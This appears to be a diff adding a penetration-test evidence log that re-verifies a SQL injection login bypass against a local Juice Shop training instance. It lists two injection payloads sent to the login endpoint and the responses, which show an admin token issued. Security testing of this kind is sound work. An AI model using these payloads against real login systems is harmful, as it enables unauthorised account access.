@@ -1,0 +1,19 @@
+# EVID-REVERIFY-C1
+# Phase 10 current-instance re-verification of SQLi authentication bypass
+# Candidate: C1 = SQL Injection authentication bypass
+# Historical evidence: evidence/requests/WEB-VUL-001-request.txt + evidence/responses/WEB-VUL-001-response.txt
+# Target: http://127.0.0.1:3000
+# Route/Endpoint: POST /rest/user/login
+# Date/Time: 2026-10-03T21:18:00+05:30
+# Method: curl (executed)
+
+--- CONTROL: invalid credentials (expected 401) ---
+Invalid email or password.HTTP:401
+--- TEST (tokens redacted): ' OR 1=1-- ---
+{"authentication":{"token":"[REDACTED-JWT]","bid":1,"umail":"admin@juice-sh.op"}}
+--- TEST (tokens redacted): ' OR '1'='1' -- ---
+{"authentication":{"token":"[REDACTED-JWT]","bid":1,"umail":"admin@juice-sh.op"}}
+--- result interpretation ---
+- Control: HTTP 401 (invalid credentials rejected - correct secure baseline)
+- Test payloads: HTTP 200 with admin-role JWT -> authentication bypass confirmed
+- Verdict: CONFIRMED on current instance
